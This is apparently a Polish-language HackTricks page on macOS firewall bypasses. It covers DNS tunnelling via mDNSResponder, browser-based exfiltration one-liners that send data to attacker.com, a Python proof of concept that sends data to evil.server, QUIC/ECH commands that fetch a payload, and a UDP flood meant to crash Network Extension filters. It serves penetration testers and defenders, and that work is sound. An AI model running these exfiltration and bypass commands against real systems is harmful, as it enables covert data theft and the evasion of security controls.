# Omijanie firewalli w macOS

{{#include ../../banners/hacktricks-training.md}}

## Znalezione techniki

Poniższe techniki działały w niektórych aplikacjach firewall dla macOS.

### Nadużywanie nazw whitelisty

- Na przykład uruchamianie malware pod nazwami dobrze znanych procesów macOS, takich jak **`launchd`**

### Synthetic Click

- Jeśli firewall poprosi użytkownika o zgodę, sprawienie, aby malware **kliknęło opcję allow**

### **Używanie binariów podpisanych przez Apple**

- Takich jak **`curl`**, ale także innych, na przykład **`whois`**

### Dobrze znane domeny Apple

Firewall może zezwalać na połączenia z dobrze znanymi domenami Apple, takimi jak **`apple.com`** lub **`icloud.com`**. iCloud może zostać użyty jako C2.

### Generic Bypass

Kilka pomysłów na ominięcie firewalli

### Sprawdzanie dozwolonego ruchu

Znajomość dozwolonego ruchu pomoże zidentyfikować potencjalnie umieszczone na whiteliście domeny lub ustalić, które aplikacje mogą uzyskiwać do nich dostęp
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### Nadużywanie DNS

W macOS proces **nie** komunikuje się bezpośrednio z serwerem DNS. Rozpoznawanie nazw jest pośredniczone przez **XPC** przez **`mDNSResponder`** (`/usr/sbin/mDNSResponder`) — podpisanego przez Apple systemowego daemona, dlatego każde zapytanie na komputerze opuszcza hosta jako ruch **pochodzący od `mDNSResponder`**, a nie od procesu, który go zainicjował. Firewalle mają więc tendencję do bezwarunkowego ufania temu daemonowi — zablokowanie go przerwałoby rozpoznawanie nazw w całym systemie.<sup>[[1]](#references)</sup>

Dzięki temu DNS pozostaje otwartym kanałem nawet wtedy, gdy firewall blokuje własne sockety malware:<sup>[[1]](#references)</sup>

1. Malware próbuje połączyć się z `evil.com`. Jego **własne** połączenie wychodzące jest sprawdzane przez firewall i **blokowane**.
2. Malware zamiast tego prosi `mDNSResponder` o **rozpoznanie** `evil.com` przez XPC.
3. Firewall sprawdza wynikające z tego zapytanie, widzi zaufany resolver podpisany przez Apple jako inicjatora i **zezwala na nie**.
4. Zapytanie dociera do serwera DNS — a jeśli atakujący obsługuje autorytatywny serwer dla `evil.com`, kontroluje oba końce wymiany.

Ponieważ atakujący jest właścicielem tej strefy, żadne „połączenie” nie jest potrzebne: dane są przemycane wewnątrz **etykiet zapytań** (np. `<encoded-chunk>.evil.com`), a polecenia wracają wewnątrz **rekordów odpowiedzi** (TXT, A, CNAME…), co stanowi klasyczny DNS tunnelling wykorzystujący proces w pełni umieszczony na whitelist.

Każdy nieuprzywilejowany proces może bezpośrednio sterować daemonem, co jest łatwym sposobem na potwierdzenie, że ta ścieżka pozostaje otwarta:
```bash
# resolution is performed by mDNSResponder on the caller's behalf
dns-sd -G v4v6 evil.com
```
### Za pośrednictwem aplikacji przeglądarkowych

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- Google Chrome
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Via process injection

Jeśli możesz **wstrzyknąć code do procesu**, który ma uprawnienia do łączenia się z dowolnym serwerem, możesz ominąć zabezpieczenia firewall:


{{#ref}}
macos-proces-abuse/
{{#endref}}

---

## Ostatnie luki umożliwiające obejście macOS firewall (2023-2025)

### Obejście Web content filter (Screen Time) – **CVE-2024-44206**
W lipcu 2024 roku firma Apple załatała krytyczny błąd w Safari/WebKit, który umożliwiał obejście systemowego „Web content filter” używanego przez kontrolę rodzicielską Screen Time.
Specjalnie spreparowany URI (na przykład zawierający podwójnie zakodowane w URL „://”) nie jest rozpoznawany przez ACL Screen Time, ale jest akceptowany przez WebKit, przez co żądanie jest wysyłane bez filtrowania. W związku z tym każdy proces, który może otworzyć URL (w tym code działający w sandboxie lub niepodpisany), może uzyskać dostęp do domen jawnie zablokowanych przez użytkownika lub profil MDM.<sup>[[2]](#references)</sup>

Praktyczny test (system bez zainstalowanej poprawki):
```bash
open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
# if the patch is missing Safari will happily load the page
```
### Błąd kolejności reguł Packet Filter (PF) we wczesnym macOS 14 „Sonoma”
Podczas cyklu beta macOS 14 firma Apple wprowadziła regresję w userspace wrapperze wokół **`pfctl`**.
Reguły dodane z użyciem słowa kluczowego `quick` (używanego przez wiele VPN kill-switches) były po cichu ignorowane, powodując leak ruchu nawet wtedy, gdy GUI VPN/firewalla wyświetlało *blocked*. Błąd został potwierdzony przez kilku dostawców VPN i naprawiony w RC 2 (build 23A344).<sup>[[6]](#references)</sup>

Szybki leak-check:
```bash
pfctl -sr | grep quick       # rules are present…
sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
```
### Nadużywanie usług pomocniczych podpisanych przez Apple (starsze wersje – przed macOS 11.2)
Przed macOS 11.2 **`ContentFilterExclusionList`** zezwalała około 50 plikom binarnym Apple, takim jak **`nsurlsessiond`** i App Store, na omijanie wszystkich firewalli filtrujących sockety, zaimplementowanych z użyciem frameworka Network Extension (LuLu, Little Snitch itd.).
Malware mógł po prostu uruchomić wykluczony proces — lub wstrzyknąć do niego kod — i tunelować własny ruch przez już dozwolony socket. Apple całkowicie usunęło listę wykluczeń w macOS 11.2, ale technika ta nadal ma zastosowanie w systemach, których nie można zaktualizować.<sup>[[3]](#references)</sup>

Przykładowy proof-of-concept (przed 11.2):
```python
import subprocess, socket
# Launch excluded App Store helper (path collapsed for clarity)
subprocess.Popen(['/System/Applications/App\\ Store.app/Contents/MacOS/App Store'])
# Connect through the inherited socket
s = socket.create_connection(("evil.server", 443))
s.send(b"exfil...")
```
### QUIC/ECH w celu ominięcia filtrów domenowych Network Extension (macOS 12+)
NEFilter Packet/Data Providers opierają się na SNI/ALPN z TLS ClientHello. W przypadku **HTTP/3 over QUIC (UDP/443)** oraz **Encrypted Client Hello (ECH)** SNI pozostaje zaszyfrowane, NetExt nie może przeanalizować przepływu, a reguły nazw hostów często działają w trybie fail-open, umożliwiając malware dostęp do zablokowanych domen bez korzystania z DNS.<sup>[[5]](#references)</sup>

Minimalny PoC:
```bash
# Chrome/Edge – force HTTP/3 and ECH
/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \
--enable-quic --origin-to-force-quic-on=attacker.com:443 \
--enable-features=EncryptedClientHello --user-data-dir=/tmp/h3test \
https://attacker.com/payload

# cURL 8.10+ built with quiche
curl --http3-only https://attacker.com/payload
```
Jeśli QUIC/ECH jest nadal włączone, jest to łatwa ścieżka obejścia filtrowania hostname.

### Niestabilność Network Extension w macOS 15 „Sequoia” (2024–2025)
Wczesne wersje 15.0/15.1 powodują awarie filtrów **Network Extension** innych firm (LuLu, Little Snitch, Defender, SentinelOne itd.). Gdy filtr uruchamia się ponownie, macOS usuwa reguły przepływów, a wiele produktów przechodzi w tryb fail-open. Zalewanie filtra tysiącami krótkich przepływów UDP (lub wymuszanie QUIC/ECH) może wielokrotnie wywoływać awarię i pozostawić okno dla C2/exfil, podczas gdy GUI nadal informuje, że firewall działa.<sup>[[4]](#references)</sup>

Szybka reprodukcja (bezpieczne środowisko laboratoryjne):
```bash
# create many short UDP flows to exhaust NE filter queues
python3 - <<'PY'
import socket, os
for i in range(5000):
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(b'X'*32, ('1.1.1.1', 53))
PY
# watch for NetExt crash / reconnect loop
log stream --predicate 'subsystem == "com.apple.networkextension"' --style syslog
```
---

## Wskazówki dotyczące narzędzi dla nowoczesnego macOS

1. Sprawdź bieżące reguły PF generowane przez zapory GUI:
```bash
sudo pfctl -a com.apple/250.ApplicationFirewall -sr
```
2. Wylicz pliki binarne, które już posiadają entitlement *outgoing-network* (przydatne do piggy-backing):
```bash
codesign -d --entitlements :- /path/to/bin 2>/dev/null \
| plutil -extract com.apple.security.network.client xml1 -o - -
```
3. Programowo zarejestruj własny filtr zawartości Network Extension w Objective-C/Swift.
Minimalny rootless PoC przekazujący pakiety do lokalnego socketu jest dostępny w kodzie źródłowym **LuLu** autorstwa Patricka Wardle’a.

## Odniesienia

- [1] [DEF CON 26 - Patrick Wardle - Fire & Ice: tworzenie i łamanie zapór macOS](https://www.youtube.com/watch?v=UlT5KFTMn2k)
- [2] [Bypass filtra treści internetowych Apple umożliwia nieograniczony dostęp do zablokowanych treści (CVE-2024-44206) - Nosebeard Labs](https://nosebeard.co/advisories/nbl-001.html)
- [3] [Apple usuwa funkcję macOS umożliwiającą aplikacjom omijanie zabezpieczeń zapory - The Hacker News](https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html)
- [4] [Produkty cyberbezpieczeństwa przestają działać po aktualizacji macOS Sequoia - SecurityWeek](https://www.securityweek.com/cybersecurity-products-conking-out-after-macos-sequoia-update/)
- [5] [Używanie ochrony sieci w celu zapobiegania połączeniom macOS z niebezpiecznymi witrynami - Microsoft Defender for Endpoint | Microsoft Learn](https://learn.microsoft.com/en-us/defender-endpoint/network-protection-macos)
- [6] [Naprawiono błąd zapory macOS 14 Sonoma! - Mullvad VPN Blog](https://mullvad.net/en/blog/2023/9/22/macos-14-sonoma-firewall-bug-fixed)

{{#include ../../banners/hacktricks-training.md}}
